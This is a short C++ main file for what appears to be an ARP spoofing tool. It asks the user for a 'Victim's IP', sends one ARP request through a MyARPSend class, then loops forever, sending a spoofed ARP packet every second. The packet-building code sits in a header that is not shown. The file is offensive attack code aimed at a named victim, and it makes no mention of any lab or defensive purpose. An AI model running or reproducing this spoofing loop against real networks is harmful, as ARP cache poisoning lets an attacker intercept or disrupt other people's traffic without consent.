#include "MyARPSend.h"
#include <string>
#include <iostream>
#include <unistd.h>

using namespace std;

int main(void)
{
	string victim_ip;

	cout << "Input Victim's IP : ";
	cin >> victim_ip;
	MyARPSend MyARPSendObject = MyARPSend(victim_ip);

	MyARPSendObject.send_request_packet();
	while(1)
	{
		sleep(1);
		MyARPSendObject.send_spoof_packet();
	}
}
